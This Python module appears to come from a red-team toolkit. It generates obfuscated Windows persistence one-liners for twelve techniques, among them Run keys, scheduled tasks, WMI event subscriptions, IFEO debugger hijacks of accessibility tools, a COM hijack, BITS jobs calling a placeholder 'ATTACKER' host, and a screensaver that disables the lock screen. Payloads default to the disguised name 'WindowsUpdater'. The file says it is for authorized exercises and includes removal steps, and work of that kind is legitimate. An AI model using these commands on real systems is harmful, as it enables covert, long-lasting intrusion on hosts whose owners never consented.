"""
Windows persistence template generator.
Returns obfuscated one-liners for establishing persistence on a compromised host.
For use in authorized red team exercises only.
"""
import random
import string
from dataclasses import dataclass

from .obfuscate import ps_tick_marks

_CHARSET = string.ascii_lowercase + string.digits

SUPPORTED_TECHNIQUES = (
    "run_key",
    "run_key_hklm",
    "schtask_onlogon",
    "schtask_onboot",
    "schtask_minute",
    "startup_lnk",
    "wmi_subscription",
    "service_create",
    "registry_debugger",
    "com_hijack",
    "bits_job",
    "screensaver",
)


@dataclass
class PersistResult:
    command: str
    technique: str
    notes: str


def _rand_name(length: int = 8) -> str:
    return "".join(random.choices(_CHARSET, k=length))


# ── Techniques ────────────────────────────────────────────────────────────────

def _run_key(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
        f'/v "{name}" /t REG_SZ /d "{payload}" /f'
    )
    return PersistResult(
        command=cmd,
        technique="run_key",
        notes=(
            "HKCU Run key — no admin required. Fires on every user logon. "
            "Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{name}. "
            "Remove with: reg.exe delete HKCU\\...\\Run /v {name} /f"
        ).format(name=name),
    )


def _run_key_hklm(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
        f'/v "{name}" /t REG_SZ /d "{payload}" /f'
    )
    return PersistResult(
        command=cmd,
        technique="run_key_hklm",
        notes=(
            "HKLM Run key — requires local admin. Fires on every user logon system-wide. "
            "More persistent than HKCU across account changes."
        ),
    )


def _schtask_onlogon(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'schtasks /Create /TN "{name}" /TR "{payload}" '
        f'/SC ONLOGON /F /RL HIGHEST'
    )
    return PersistResult(
        command=cmd,
        technique="schtask_onlogon",
        notes=(
            "Scheduled task on user logon. /RL HIGHEST runs with highest available privilege. "
            f"Remove: schtasks /Delete /TN \"{name}\" /F"
        ),
    )


def _schtask_onboot(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'schtasks /Create /TN "{name}" /TR "{payload}" '
        f'/SC ONSTART /RU SYSTEM /F'
    )
    return PersistResult(
        command=cmd,
        technique="schtask_onboot",
        notes=(
            "Scheduled task at system boot — requires admin. Runs as SYSTEM. "
            f"Remove: schtasks /Delete /TN \"{name}\" /F"
        ),
    )


def _schtask_minute(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'schtasks /Create /TN "{name}" /TR "{payload}" '
        f'/SC MINUTE /MO 5 /F'
    )
    return PersistResult(
        command=cmd,
        technique="schtask_minute",
        notes=(
            "Scheduled task every 5 minutes — no admin required. "
            "Provides rapid re-execution if payload is killed. "
            f"Remove: schtasks /Delete /TN \"{name}\" /F"
        ),
    )


def _startup_lnk(payload: str, name: str, obfuscate: bool) -> PersistResult:
    lnk_var = "$" + _rand_name(3)
    sh_var = "$" + _rand_name(3)
    code = (
        f"{sh_var}=New-Object -ComObject WScript.Shell;"
        f"{lnk_var}={sh_var}.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.lnk\");"
        f"{lnk_var}.TargetPath=\"{payload}\";"
        f"{lnk_var}.Save()"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return PersistResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="startup_lnk",
        notes=(
            "Drops a .lnk shortcut in the per-user Startup folder. No admin required. "
            "Fires on next logon. "
            f"Remove: del \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.lnk\""
        ),
    )


def _wmi_subscription(payload: str, name: str, obfuscate: bool) -> PersistResult:
    # CommandLineEventConsumer fires payload every 60 seconds — no scripting engine required
    filter_name = f"{name}Filter"
    consumer_name = f"{name}Consumer"
    code = (
        f"$f=Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
        f"-Arguments @{{Name='{filter_name}';"
        f"EventNameSpace='root\\cimv2';"
        f"QueryLanguage='WQL';"
        f"Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'}};"
        f"$c=Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer "
        f"-Arguments @{{Name='{consumer_name}';CommandLineTemplate='{payload}'}};"
        f"Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding "
        f"-Arguments @{{Filter=$f;Consumer=$c}}"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return PersistResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="wmi_subscription",
        notes=(
            "WMI event subscription fires payload every ~60s via CommandLineEventConsumer. "
            "Requires admin. Survives reboots. "
            "Remove: Get-WMIObject -Namespace root\\subscription -Class __EventFilter | "
            f"Where-Object {{$_.Name -eq '{filter_name}'}} | Remove-WmiObject"
        ),
    )


def _service_create(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'sc.exe create "{name}" binPath= "{payload}" start= auto && '
        f'sc.exe start "{name}"'
    )
    return PersistResult(
        command=cmd,
        technique="service_create",
        notes=(
            "Creates and starts a Windows service — requires admin. "
            "Service starts automatically on boot. "
            f"Remove: sc.exe stop \"{name}\" && sc.exe delete \"{name}\""
        ),
    )


def _registry_debugger(payload: str, name: str, obfuscate: bool) -> PersistResult:
    # name param is reused as the target process name here
    proc = name if name.endswith(".exe") else f"{name}.exe"
    cmd = (
        f'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\'
        f'Image File Execution Options\\{proc}" /v Debugger /t REG_SZ /d "{payload}" /f'
    )
    return PersistResult(
        command=cmd,
        technique="registry_debugger",
        notes=(
            f"IFEO Debugger key on {proc} — requires admin. "
            f"Payload fires instead of (or before) {proc} every time it's launched. "
            "Common targets: sethc.exe (Sticky Keys), utilman.exe, osk.exe. "
            f"Remove: reg.exe delete \"HKLM\\...\\{proc}\" /v Debugger /f"
        ),
    )


def _com_hijack(payload: str, name: str, obfuscate: bool) -> PersistResult:
    # Use a commonly loaded CLSID; {BCDE0395-E52F-467C-8E3D-C4579291692E} = MMDeviceEnumerator
    clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
    cmd = (
        f'reg.exe add "HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" '
        f'/ve /t REG_SZ /d "{payload}" /f && '
        f'reg.exe add "HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" '
        f'/v ThreadingModel /t REG_SZ /d "Both" /f'
    )
    return PersistResult(
        command=cmd,
        technique="com_hijack",
        notes=(
            "HKCU COM hijack of MMDeviceEnumerator — no admin required. "
            "Payload DLL is loaded whenever the audio subsystem initialises (e.g. on Explorer launch). "
            "payload must be a DLL path. "
            f"Remove: reg.exe delete \"HKCU\\Software\\Classes\\CLSID\\{clsid}\" /f"
        ),
    )


def _bits_job(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'bitsadmin /create /download "{name}" && '
        f'bitsadmin /addfile "{name}" "https://ATTACKER/placeholder" "%TEMP%\\placeholder" && '
        f'bitsadmin /SetNotifyCmdLine "{name}" "{payload}" "" && '
        f'bitsadmin /SetMinRetryDelay "{name}" 60 && '
        f'bitsadmin /resume "{name}"'
    )
    return PersistResult(
        command=cmd,
        technique="bits_job",
        notes=(
            "BITS job with notification command — fires payload when job completes or on retry. "
            "Survives reboots; BITS service runs as SYSTEM. Replace ATTACKER with a staging host. "
            f"Remove: bitsadmin /cancel \"{name}\""
        ),
    )


def _screensaver(payload: str, name: str, obfuscate: bool) -> PersistResult:
    cmd = (
        f'reg.exe add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "{payload}" /f && '
        f'reg.exe add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f && '
        f'reg.exe add "HKCU\\Control Panel\\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f && '
        f'reg.exe add "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f'
    )
    return PersistResult(
        command=cmd,
        technique="screensaver",
        notes=(
            "Screensaver persistence via SCRNSAVE.EXE registry key — no admin required. "
            "Fires payload after 60s of inactivity. ScreenSaverIsSecure=0 skips the lock screen. "
            "Remove: reg.exe delete \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /f"
        ),
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "run_key": _run_key,
    "run_key_hklm": _run_key_hklm,
    "schtask_onlogon": _schtask_onlogon,
    "schtask_onboot": _schtask_onboot,
    "schtask_minute": _schtask_minute,
    "startup_lnk": _startup_lnk,
    "wmi_subscription": _wmi_subscription,
    "service_create": _service_create,
    "registry_debugger": _registry_debugger,
    "com_hijack": _com_hijack,
    "bits_job": _bits_job,
    "screensaver": _screensaver,
}


def generate_persist(
    technique: str,
    payload: str = "C:\\Windows\\Temp\\payload.exe",
    name: str = "WindowsUpdater",
    obfuscate: bool = True,
) -> PersistResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](payload, name, obfuscate)
